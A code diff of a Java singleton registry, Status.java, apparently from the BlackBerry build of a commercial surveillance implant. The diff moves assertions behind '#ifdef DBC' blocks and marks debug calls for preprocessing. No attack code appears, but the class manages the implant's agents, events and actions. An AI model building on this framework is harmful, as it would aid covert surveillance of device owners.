@@ -28,7 +28,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
  */
 public final class Status implements Singleton {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug = new Debug("Status", DebugLevel.VERBOSE);
 
     /** The agents. */
@@ -82,17 +82,21 @@ public final class Status implements Singleton {
      */
     public synchronized void addAction(Action action) {
 
-        Check.requires(actions != null, "Null actions");
-        Check.requires(action != null, "Null action");
-        Check.requires(action.actionId >= 0, "actionId == " + action.actionId);
-
-        Check.asserts(actions.containsKey(action.actionId) == false,
-                "Action already present: " + action);
+        // #ifdef DBC
+//@        Check.requires(actions != null, "Null actions");
+//@        Check.requires(action != null, "Null action");
+//@        Check.requires(action.actionId >= 0, "actionId == " + action.actionId);
+//@        Check.asserts(actions.containsKey(action.actionId) == false,
+//@                "Action already present: " + action);
+        // #endif
 
         actions.put(action.actionId, action);
 
-        Check.ensures(actions.containsKey(action.actionId),
-                "Action not inserted: " + action);
+        // #ifdef DBC
+//@        Check.ensures(actions.containsKey(action.actionId),
+//@                "Action not inserted: " + action);
+        // #endif
+
     }
 
     /**
@@ -103,23 +107,29 @@ public final class Status implements Singleton {
      */
     public synchronized void addAgent(Agent agent) {
         if (agent == null) {
-            debug.error("Status.java - AddAgent NULL");
+            // #debug
+             debug.error("Status.java - AddAgent NULL");
             return;
         }
 
-        Check.requires(agents != null, "Null Agents");
-        Check.requires(agent != null, "Null Agent");
-        Check.requires(agent.agentId >= 0, "AgentId == " + agent.agentId);
-
-        Check.asserts(agents.containsKey(agent.agentId) == false,
-                "Agent already present: " + agent);
+        // #ifdef DBC
+//@        Check.requires(agents != null, "Null Agents");
+//@        Check.requires(agent != null, "Null Agent");
+//@        Check.requires(agent.agentId >= 0, "AgentId == " + agent.agentId);
+//@        Check.asserts(agents.containsKey(agent.agentId) == false,
+//@                "Agent already present: " + agent);
+        // #endif
 
         agents.put(agent.agentId, agent);
 
-        debug.trace("Agent added:" + agent);
+        // #debug
+         debug.trace("Agent added:" + agent);
 
-        Check.ensures(agents.containsKey(agent.agentId), "Agent not inserted: "
-                + agent);
+        // #ifdef DBC
+//@        Check.ensures(agents.containsKey(agent.agentId), "Agent not inserted: "
+//@                + agent);
+        // #endif
+
     }
 
     /**
@@ -132,18 +142,22 @@ public final class Status implements Singleton {
      */
     public synchronized void addEvent(int eventId_, Event event) {
 
-        Check.requires(events != null, "Null Events");
-        Check.requires(event != null, "Null Event");
-        Check.requires(eventId_ >= 0, "EventId == " + eventId_);
-
-        Check.asserts(events.containsKey(eventId_) == false,
-                "Event already present: " + event);
+        // #ifdef DBC
+//@        Check.requires(events != null, "Null Events");
+//@        Check.requires(event != null, "Null Event");
+//@        Check.requires(eventId_ >= 0, "EventId == " + eventId_);
+//@        Check.asserts(events.containsKey(eventId_) == false,
+//@                "Event already present: " + event);
+        // #endif
 
         event.eventId = eventId_;
         events.put(eventId_, event);
 
-        Check.ensures(events.containsKey(eventId_), "Event not inserted: "
-                + event);
+        // #ifdef DBC
+//@        Check.ensures(events.containsKey(eventId_), "Event not inserted: "
+//@                + event);
+        // #endif
+
     }
 
     /**
@@ -153,41 +167,43 @@ public final class Status implements Singleton {
      *            the parameter
      */
     public synchronized void addParameter(Parameter parameter) {
-        Check.requires(parameters != null, "Null parameters");
-        Check.requires(parameter != null, "Null parameter");
-        Check.requires(parameter.parameterId >= 0, "ParameterId == "
-                + parameter.parameterId);
-
-        Check.asserts(actions.containsKey(parameter.parameterId) == false,
-                "Parameter already present: " + parameter);
+        // #ifdef DBC
+//@        Check.requires(parameters != null, "Null parameters");
+//@        Check.requires(parameter != null, "Null parameter");
+//@        Check.requires(parameter.parameterId >= 0, "ParameterId == "
+//@                + parameter.parameterId);
+//@        Check.asserts(actions.containsKey(parameter.parameterId) == false,
+//@                "Parameter already present: " + parameter);
+        // #endif
 
         parameters.put(parameter.parameterId, parameter);
 
-        Check.ensures(parameters.containsKey(parameter.parameterId),
-                "Parameter not inserted: " + parameter);
+        // #ifdef DBC
+//@        Check.ensures(parameters.containsKey(parameter.parameterId),
+//@                "Parameter not inserted: " + parameter);
+        // #endif
 
     }
 
-/*    *//**
+    /*    *//**
      * Agent alive.
      * 
      * @param agentId
      *            the agent id
      * @return true, if successful
-     *//*
-    public synchronized boolean agentAlive(int agentId) {
-
-        Agent agent = getAgent(agentId);
-
-        if (agent == null) {
-            debug.error("AgentAlive FAILED");
-            return false;
-        }
-
-        agent.agentStatus = Common.AGENT_RUNNING;
-        return true;
-
-    }*/
+     */
+    /*
+     * public synchronized boolean agentAlive(int agentId) {
+     * 
+     * Agent agent = getAgent(agentId);
+     * 
+     * if (agent == null) { //#debug debug.error("AgentAlive FAILED"); return
+     * false; }
+     * 
+     * agent.agentStatus = Common.AGENT_RUNNING; return true;
+     * 
+     * }
+     */
 
     /**
      * Agent check and stop.
@@ -196,18 +212,16 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if successful
      */
-   /* public synchronized boolean agentCheckAndStop(int agentId) {
-        Agent agent = getAgent(agentId);
-
-        if (agent == null || agent.command != Common.AGENT_STOP) {
-            debug.error("AgentCheckAndStop FAILED");
-            return false;
-        }
-
-        agent.agentStatus = Common.AGENT_STOPPED;
-        agent.command = Common.NO_COMMAND;
-        return true;
-    }*/
+    /*
+     * public synchronized boolean agentCheckAndStop(int agentId) { Agent agent
+     * = getAgent(agentId);
+     * 
+     * if (agent == null || agent.command != Common.AGENT_STOP) { //#debug
+     * debug.error("AgentCheckAndStop FAILED"); return false; }
+     * 
+     * agent.agentStatus = Common.AGENT_STOPPED; agent.command =
+     * Common.NO_COMMAND; return true; }
+     */
 
     /**
      * Agent query status.
@@ -216,16 +230,15 @@ public final class Status implements Singleton {
      *            the agent id
      * @return the int
      */
-   /* public synchronized int agentQueryStatus(int agentId) {
-
-        Agent agent = getAgent(agentId);
-
-        if (agent == null) {
-            return 0;
-        }
-
-        return agent.agentStatus;
-    }*/
+    /*
+     * public synchronized int agentQueryStatus(int agentId) {
+     * 
+     * Agent agent = getAgent(agentId);
+     * 
+     * if (agent == null) { return 0; }
+     * 
+     * return agent.agentStatus; }
+     */
 
     /**
      * Agent query stop.
@@ -234,21 +247,22 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if successful
      */
-   /* public synchronized boolean agentQueryStop(int agentId) {
-        Agent agent = getAgent(agentId);
-
-        if (agent == null || agent.command != Common.AGENT_STOP) {
-            return false;
-        }
-
-        return true;
-    }*/
+    /*
+     * public synchronized boolean agentQueryStop(int agentId) { Agent agent =
+     * getAgent(agentId);
+     * 
+     * if (agent == null || agent.command != Common.AGENT_STOP) { return false;
+     * }
+     * 
+     * return true; }
+     */
 
     /**
      * Clear.
      */
     public void clear() {
-        debug.info("Clear");
+        // #debug
+         debug.info("Clear");
 
         agents.clear();
         actions.clear();
@@ -292,7 +306,9 @@ public final class Status implements Singleton {
      * @return the vector
      */
     public synchronized Vector getActionsList() {
-        Check.requires(actions != null, "Null actions");
+        // #ifdef DBC
+//@        Check.requires(actions != null, "Null actions");
+        // #endif
 
         Enumeration e = actions.elements();
         Vector vect = new Vector();
@@ -301,8 +317,11 @@ public final class Status implements Singleton {
             vect.addElement(e.nextElement());
         }
 
-        Check.ensures(actions.size() == vect.size(),
-                "actions not equal to vect");
+        // #ifdef DBC
+//@        Check.ensures(actions.size() == vect.size(),
+//@                "actions not equal to vect");
+        // #endif
+
         return vect;
     }
 
@@ -317,10 +336,13 @@ public final class Status implements Singleton {
         if (agents.containsKey(agentId)) {
             Agent agent = (Agent) agents.get(agentId);
 
-            Check.ensures(agent.agentId == agentId, "not equal agentId");
+            // #ifdef DBC
+//@            Check.ensures(agent.agentId == agentId, "not equal agentId");
+            // #endif
             return agent;
         } else {
-            debug.trace("Agents don't contain type " + agentId);
+            // #debug
+             debug.trace("Agents don't contain type " + agentId);
             return null;
         }
     }
@@ -331,7 +353,9 @@ public final class Status implements Singleton {
      * @return the vector
      */
     public synchronized Vector getAgentsList() {
-        Check.requires(agents != null, "Null Agents");
+        // #ifdef DBC
+//@        Check.requires(agents != null, "Null Agents");
+        // #endif
 
         Enumeration e = agents.elements();
         Vector vect = new Vector();
@@ -340,7 +364,9 @@ public final class Status implements Singleton {
             vect.addElement(e.nextElement());
         }
 
-        Check.ensures(agents.size() == vect.size(), "agents not equal to vect");
+        // #ifdef DBC
+//@        Check.ensures(agents.size() == vect.size(), "agents not equal to vect");
+        // #endif
         return vect;
     }
 
@@ -355,10 +381,13 @@ public final class Status implements Singleton {
         if (events.containsKey(eventId)) {
             Event event = (Event) events.get(eventId);
 
-            Check.ensures(event.eventId == eventId, "not equal eventId");
+            // #ifdef DBC
+//@            Check.ensures(event.eventId == eventId, "not equal eventId");
+            // #endif
             return event;
         } else {
-            debug.error("Events don't contain type " + eventId);
+            // #debug
+             debug.error("Events don't contain type " + eventId);
             return null;
         }
     }
@@ -369,7 +398,9 @@ public final class Status implements Singleton {
      * @return the vector
      */
     public synchronized Vector getEventsList() {
-        Check.requires(events != null, "Null Events");
+        // #ifdef DBC
+//@        Check.requires(events != null, "Null Events");
+        // #endif
 
         Enumeration e = events.elements();
         Vector vect = new Vector();
@@ -378,7 +409,9 @@ public final class Status implements Singleton {
             vect.addElement(e.nextElement());
         }
 
-        Check.ensures(events.size() == vect.size(), "events not equal to vect");
+        // #ifdef DBC
+//@        Check.ensures(events.size() == vect.size(), "events not equal to vect");
+        // #endif
         return vect;
     }
 
@@ -388,7 +421,9 @@ public final class Status implements Singleton {
      * @return the vector
      */
     public synchronized Vector getParametersList() {
-        Check.requires(parameters != null, "Null parameters");
+        // #ifdef DBC
+//@        Check.requires(parameters != null, "Null parameters");
+        // #endif
 
         Enumeration e = parameters.elements();
         Vector vect = new Vector();
@@ -397,8 +432,11 @@ public final class Status implements Singleton {
             vect.addElement(e.nextElement());
         }
 
-        Check.ensures(parameters.size() == vect.size(),
-                "parameters not equal to vect");
+        // #ifdef DBC
+//@        Check.ensures(parameters.size() == vect.size(),
+//@                "parameters not equal to vect");
+        // #endif
+
         return vect;
     }
 
@@ -434,12 +472,14 @@ public final class Status implements Singleton {
     public synchronized boolean reEnableAgent(int agentId) {
         Agent agent = getAgent(agentId);
 
-        if (agent == null || ! agent.isRunning()) {
-            debug.error("cannot renable agent " + agent);
+        if (agent == null || !agent.isRunning()) {
+            // #debug
+             debug.error("cannot renable agent " + agent);
             return false;
         }
 
-        debug.trace("ReEnabling " + agent);
+        // #debug
+         debug.trace("ReEnabling " + agent);
         agent.enable(true);
         return true;
     }
@@ -474,39 +514,33 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if successful
      */
-    /*public synchronized boolean stopAgent(int agentId) {
-
-        Agent agent = getAgent(agentId);
-
-        if (agent != null) {
-            agent.stop();
-        }
-
-        try {
-            agent.join();
-        } catch (InterruptedException e) {
-            debug.error("Interrupted");
-        }
-       
-        return true;
-    }
-*/
+    /*
+     * public synchronized boolean stopAgent(int agentId) {
+     * 
+     * Agent agent = getAgent(agentId);
+     * 
+     * if (agent != null) { agent.stop(); }
+     * 
+     * try { agent.join(); } catch (InterruptedException e) { //#debug
+     * debug.error("Interrupted"); }
+     * 
+     * return true; }
+     */
     /**
      * Stop agents.
      */
-   /* public synchronized void stopAgents() {
-
-        Enumeration e = agents.elements();
-
-        while (e.hasMoreElements()) {
-            Agent agent = (Agent) e.nextElement();
-
-            if (agent.agentStatus == Common.AGENT_RUNNING) {
-                agent.command = Common.AGENT_STOP;
-            }
-        }
-
-    }*/
+    /*
+     * public synchronized void stopAgents() {
+     * 
+     * Enumeration e = agents.elements();
+     * 
+     * while (e.hasMoreElements()) { Agent agent = (Agent) e.nextElement();
+     * 
+     * if (agent.agentStatus == Common.AGENT_RUNNING) { agent.command =
+     * Common.AGENT_STOP; } }
+     * 
+     * }
+     */
 
     /**
      * Stop crisis.
@@ -522,21 +556,16 @@ public final class Status implements Singleton {
      *            the event id
      * @return true, if successful
      */
-   /* public boolean stopEvent(int eventId) {
-        Event event = getEvent(eventId);
-
-        if (event != null) {
-            event.stop();
-        }
-
-        try {
-            event.join();
-        } catch (InterruptedException e) {
-            debug.error("Interrupted");
-        }
-
-        return true;
-    }*/
+    /*
+     * public boolean stopEvent(int eventId) { Event event = getEvent(eventId);
+     * 
+     * if (event != null) { event.stop(); }
+     * 
+     * try { event.join(); } catch (InterruptedException e) { //#debug
+     * debug.error("Interrupted"); }
+     * 
+     * return true; }
+     */
 
     /**
      * Thread agent stopped.
@@ -545,20 +574,19 @@ public final class Status implements Singleton {
      *            the agent id
      * @return true, if successful
      */
-    /*public synchronized boolean threadAgentStopped(int agentId) {
-
-        Agent agent = getAgent(agentId);
-
-        if (agent == null) {
-            debug.error("ThreadAgentStopped FAILED");
-            return false;
-        }
-
-        agent.agentStatus = Common.AGENT_STOPPED;
-        agent.command = Common.NO_COMMAND;
-
-        return true;
-    }*/
+    /*
+     * public synchronized boolean threadAgentStopped(int agentId) {
+     * 
+     * Agent agent = getAgent(agentId);
+     * 
+     * if (agent == null) { //#debug debug.error("ThreadAgentStopped FAILED");
+     * return false; }
+     * 
+     * agent.agentStatus = Common.AGENT_STOPPED; agent.command =
+     * Common.NO_COMMAND;
+     * 
+     * return true; }
+     */
 
     /**
      * Trigger action.
@@ -568,14 +596,16 @@ public final class Status implements Singleton {
      * @return true, if successful
      */
     public synchronized boolean triggerAction(int actionId) {
-        debug.trace("TriggerAction:" + actionId);
+        // #debug
+         debug.trace("TriggerAction:" + actionId);
 
         if (actions.containsKey(actionId)) {
             Action action = (Action) actions.get(actionId);
             action.setTriggered(true);
             return true;
         } else {
-            debug.error("TriggerAction FAILED " + actionId);
+            // #debug
+             debug.error("TriggerAction FAILED " + actionId);
             return false;
         }
     }
